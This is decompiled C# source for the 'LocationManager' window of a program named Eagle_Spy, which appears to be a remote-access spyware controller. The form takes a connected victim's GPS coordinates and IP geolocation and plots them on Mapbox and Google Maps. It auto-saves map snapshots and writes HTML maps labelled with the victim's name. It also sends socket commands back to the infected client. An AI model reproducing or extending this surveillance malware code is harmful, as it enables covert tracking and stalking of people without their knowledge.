using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200007B RID: 123
	[DesignerGenerated]
	public partial class LocationManager : Form
	{
		// Token: 0x06000705 RID: 1797 RVA: 0x000BB380 File Offset: 0x000B9580
		public LocationManager()
		{
			base.Load += this.LocationManager_Load;
			base.KeyDown += this.Map_KeyDown;
			base.Closing += this.LocationManager_Closing;
			this.List = new List<Array>();
			this.waiter1 = new WebClient();
			this.Title = "null";
			this.MouseState = false;
			this.Issilent = false;
			this.tmpFolderUSER = "";
			this.boSave = false;
			this.InitializeComponent();
		}

		// Token: 0x06000708 RID: 1800 RVA: 0x00004639 File Offset: 0x00002839
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000709 RID: 1801 RVA: 0x000BBDD4 File Offset: 0x000B9FD4
		private void LocationManager_Load(object sender, EventArgs e)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			this.Map.ContextMenuStrip = this.ctxMenu;
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\10.ico");
			string text = Data.cityclass.Getinfo(this.classClient.ClientAddressIP);
			string[] array = text.Split(new char[] { '#' });
			this.TextBox1.AppendText("Client Address info\r\n\r\n\r\n\r\n");
			string[] array2 = array;
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				this.TextBox1.AppendText(text2 + "\r\n---\r\n");
			}
			this.Threadingg = new Thread(new ThreadStart(this.Threadings));
			this.Threadingg.Priority = ThreadPriority.Normal;
			this.Threadingg.IsBackground = true;
			this.Threadingg.Start();
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x0600070A RID: 1802 RVA: 0x000BBEF8 File Offset: 0x000BA0F8
		private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
		{
			MemoryStream memoryStream = new MemoryStream();
			AutoResetEvent autoResetEvent = (AutoResetEvent)e.UserState;
			checked
			{
				try
				{
					if (!e.Cancelled && e.Error == null)
					{
						byte[] result = e.Result;
						memoryStream.Write(result, 0, result.Length);
						this.classClient.MyServer.BytesReceived += memoryStream.Length;
					}
				}
				finally
				{
					if (memoryStream.Length > 0L)
					{
						Image image = Image.FromStream(memoryStream);
						this.MapView(image);
					}
					autoResetEvent.Set();
				}
			}
		}

		// Token: 0x0600070B RID: 1803 RVA: 0x0000466F File Offset: 0x0000286F
		private void waiter1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
		{
			this.Progress(e);
		}

		// Token: 0x0600070C RID: 1804 RVA: 0x000BBF88 File Offset: 0x000BA188
		private void Progress(DownloadProgressChangedEventArgs e)
		{
			try
			{
				if (base.InvokeRequired)
				{
					base.Invoke(new LocationManager.Delegate1(this.Progress), new object[] { e });
				}
				else
				{
					this.ProgressBar1.Value = e.ProgressPercentage;
					if (this.ProgressBar1.Value == this.ProgressBar1.Maximum)
					{
						this.ProgressBar1.Value = 0;
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600070D RID: 1805 RVA: 0x000BC008 File Offset: 0x000BA208
		private void MapView(Image image)
		{
			try
			{
				if (base.InvokeRequired)
				{
					base.Invoke(new LocationManager.Delegate0(this.MapView), new object[] { image });
				}
				else
				{
					this.Map.Image = image;
					this.Map.Invalidate();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600070E RID: 1806 RVA: 0x000BC068 File Offset: 0x000BA268
		private void Threadings()
		{
			for (;;)
			{
				Thread.Sleep(10);
				if (this.List.Count > 0)
				{
					try
					{
						this.Latitude = (double)this.List[0].GetValue(0);
						this.Longitude = (double)this.List[0].GetValue(1);
						AutoResetEvent autoResetEvent = new AutoResetEvent(false);
						if (this.waiter1 != null)
						{
							this.waiter1.DownloadDataCompleted -= this.DownloadDataCallback;
						}
						this.waiter1.DownloadDataCompleted += this.DownloadDataCallback;
						Debug.WriteLine(this.FormatLink());
						this.waiter1.DownloadDataAsync(new Uri(this.FormatLink()), autoResetEvent);
						autoResetEvent.WaitOne();
						this.waiter1.Dispose();
						this.List.RemoveAt(0);
					}
					catch (Exception)
					{
						Debug.WriteLine("Error Threading location");
					}
				}
			}
		}

		// Token: 0x0600070F RID: 1807 RVA: 0x000BC168 File Offset: 0x000BA368
		private string FormatLink()
		{
			string text = this.Markers;
			text = text.Replace("<Longitude>", Conversions.ToString(this.Longitude)).Replace("<Latitude>", Conversions.ToString(this.Latitude));
			return string.Format("{0}{1}/static/{2}{3}?access_token={4}", new object[]
			{
				this.Link,
				this.style,
				text,
				string.Concat(new string[]
				{
					Conversions.ToString(this.Longitude),
					",",
					Conversions.ToString(this.Latitude),
					")/",
					Conversions.ToString(this.Longitude),
					",",
					Conversions.ToString(this.Latitude),
					",",
					Conversions.ToString(this.Zoom),
					"/",
					Conversions.ToString(this.ImageSize.Width),
					"x",
					Conversions.ToString(this.ImageSize.Height)
				}),
				this.Key
			});
		}

		// Token: 0x06000710 RID: 1808 RVA: 0x000BC288 File Offset: 0x000BA488
		private void NextZoom()
		{
			checked
			{
				this.Zoom++;
				if (this.Zoom >= 21)
				{
					this.Zoom = 21;
				}
				this.List.Add(new double[] { this.Latitude, this.Longitude });
			}
		}

		// Token: 0x06000711 RID: 1809 RVA: 0x000BC2D8 File Offset: 0x000BA4D8
		private void BackZoom()
		{
			checked
			{
				this.Zoom--;
				if (this.Zoom <= 1)
				{
					this.Zoom = 1;
				}
				this.List.Add(new double[] { this.Latitude, this.Longitude });
			}
		}

		// Token: 0x06000712 RID: 1810 RVA: 0x00004678 File Offset: 0x00002878
		private void Map_MouseWheel(object sender, MouseEventArgs e)
		{
			if (e.Delta < 0)
			{
				this.BackZoom();
				return;
			}
			if (e.Delta > 0)
			{
				this.NextZoom();
			}
		}

		// Token: 0x06000713 RID: 1811 RVA: 0x00004699 File Offset: 0x00002899
		private void Map_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyData == Keys.Up)
			{
				this.NextZoom();
				return;
			}
			if (e.KeyData == Keys.Down)
			{
				this.BackZoom();
			}
		}

		// Token: 0x06000714 RID: 1812 RVA: 0x000BC328 File Offset: 0x000BA528
		private void LocationManager_Closing(object sender, CancelEventArgs e)
		{
			if (!this.Issilent && this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					SecurityKey.KeysClient4 + Data.SPL_SOCKET,
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.qitGPS = true;
				this.classClient.SendMessage(array);
			}
			try
			{
				this.Threadingg.Abort();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000715 RID: 1813 RVA: 0x000046BC File Offset: 0x000028BC
		private void Map_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			this.MapBOX();
		}

		// Token: 0x06000716 RID: 1814 RVA: 0x000BC3BC File Offset: 0x000BA5BC
		private void MapBOX()
		{
			try
			{
				if (this.infoMaps.Length != 0 && Directory.Exists(this.infoMaps[0]))
				{
					string text = this.infoMaps[0] + "\\Location Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					string text2 = Resources.map;
					text2 = text2.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude))
						.Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
					string text3 = text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
					File.WriteAllText(text3, text2);
					Process.Start(text3);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000717 RID: 1815 RVA: 0x000046C4 File Offset: 0x000028C4
		private void Map_MouseHover(object sender, EventArgs e)
		{
			this.MouseState = true;
			this.Map.Invalidate();
		}

		// Token: 0x06000718 RID: 1816 RVA: 0x000046D8 File Offset: 0x000028D8
		private void Map_MouseLeave(object sender, EventArgs e)
		{
			this.MouseState = false;
			this.Map.Invalidate();
		}

		// Token: 0x06000719 RID: 1817 RVA: 0x000BC4C0 File Offset: 0x000BA6C0
		private void Map_Paint(object sender, PaintEventArgs e)
		{
			if (this.MouseState & (Operators.CompareString(this.Accuracy, "jump", false) != 0) & (Operators.CompareString(this.Speed, "jump", false) != 0))
			{
				string text = "Accuracy " + this.Accuracy + " - " + this.Speed;
				SizeF sizeF = default(SizeF);
				sizeF = e.Graphics.MeasureString(text, reso.f);
				Rectangle rectangle = checked(new Rectangle(5, 5, (int)Math.Round((double)sizeF.Width), (int)Math.Round((double)sizeF.Height)));
				Color defaultColor_Background = SpySettings.DefaultColor_Background;
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, (int)defaultColor_Background.R, (int)defaultColor_Background.G, (int)defaultColor_Background.B)).Brush, rectangle);
				e.Graphics.DrawString(text, reso.f, new SolidBrush(SpySettings.DefaultColor_Foreground), 5f, 5f);
			}
		}

		// Token: 0x0600071A RID: 1818 RVA: 0x000BC5C0 File Offset: 0x000BA7C0
		private void OpenUsingGoogleMapsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", new object[]
			{
				Conversions.ToString(this.Latitude),
				Conversions.ToString(this.Longitude),
				Conversions.ToString(this.Latitude),
				Conversions.ToString(this.Longitude),
				"17z"
			});
			Process.Start(text);
		}

		// Token: 0x0600071B RID: 1819 RVA: 0x000046BC File Offset: 0x000028BC
		private void OpenUsingMapBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.MapBOX();
		}

		// Token: 0x0600071C RID: 1820 RVA: 0x000BC628 File Offset: 0x000BA828
		private void Savetimer_Tick(object sender, EventArgs e)
		{
			string text = this.tmpFolderUSER + "\\Location Manager";
			if (this.boSave)
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				if (Directory.Exists(text))
				{
					this.Map.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
					return;
				}
			}
			else
			{
				this.savetimer.Stop();
				this.savetimer.Dispose();
			}
		}

		// Token: 0x0600071D RID: 1821 RVA: 0x000BC6B4 File Offset: 0x000BA8B4
		private void DrakeUICheckBox1_ValueChanged(object sender, bool value)
		{
			if (this.Map.Image == null)
			{
				return;
			}
			if (this.DrakeUICheckBox1.Checked)
			{
				this.savetimer.Start();
				this.boSave = true;
				string text = this.tmpFolderUSER + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
				return;
			}
			this.savetimer.Stop();
			this.boSave = false;
		}

		// Token: 0x0600071E RID: 1822 RVA: 0x000BC728 File Offset: 0x000BA928
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.infoMaps.Length != 0 && Directory.Exists(this.infoMaps[0]))
				{
					string text = this.infoMaps[0] + "\\Location Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					string text2 = Resources.map;
					text2 = text2.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude))
						.Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
					File.WriteAllText(text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html", text2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600071F RID: 1823 RVA: 0x000BC820 File Offset: 0x000BAA20
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.infoMaps.Length != 0)
				{
					this.infoMaps[0] + "\\Location Manager";
					string text = Resources.map;
					text = text.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude))
						.Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
					SaveFileDialog saveFileDialog = new SaveFileDialog();
					saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
					saveFileDialog.Filter = "html (*.html)|*.html";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						File.WriteAllText(saveFileDialog.FileName, text);
					}
					saveFileDialog.Dispose();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000720 RID: 1824 RVA: 0x000BC5C0 File Offset: 0x000BA7C0
		private void guna2GradientTileButton1_Click(object sender, EventArgs e)
		{
			string text = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", new object[]
			{
				Conversions.ToString(this.Latitude),
				Conversions.ToString(this.Longitude),
				Conversions.ToString(this.Latitude),
				Conversions.ToString(this.Longitude),
				"17z"
			});
			Process.Start(text);
		}

		// Token: 0x0400084A RID: 2122
		public string[] infoMaps;

		// Token: 0x0400084B RID: 2123
		public TcpClient Client;

		// Token: 0x0400084C RID: 2124
		public Client classClient;

		// Token: 0x0400084D RID: 2125
		public string Link;

		// Token: 0x0400084E RID: 2126
		public string Key;

		// Token: 0x0400084F RID: 2127
		public double Latitude;

		// Token: 0x04000850 RID: 2128
		public double Longitude;

		// Token: 0x04000851 RID: 2129
		public Size ImageSize;

		// Token: 0x04000852 RID: 2130
		public int Zoom;

		// Token: 0x04000853 RID: 2131
		public string Markers;

		// Token: 0x04000854 RID: 2132
		public List<Array> List;

		// Token: 0x04000855 RID: 2133
		public Thread Threadingg;

		// Token: 0x04000856 RID: 2134
		public string style;

		// Token: 0x04000857 RID: 2135
		public string Title;

		// Token: 0x04000858 RID: 2136
		public string Accuracy;

		// Token: 0x04000859 RID: 2137
		public string Speed;

		// Token: 0x0400085A RID: 2138
		private bool MouseState;

		// Token: 0x0400085B RID: 2139
		public bool Issilent;

		// Token: 0x0400085C RID: 2140
		public string tmpFolderUSER;

		// Token: 0x0400085D RID: 2141
		private bool boSave;

		// Token: 0x0400086C RID: 2156
		internal WebClient waiter1;

		// Token: 0x0200007C RID: 124
		// (Invoke) Token: 0x06000722 RID: 1826
		public delegate void Delegate1(DownloadProgressChangedEventArgs e);

		// Token: 0x0200007D RID: 125
		// (Invoke) Token: 0x06000726 RID: 1830
		public delegate void Delegate0(Image image);
	}
}
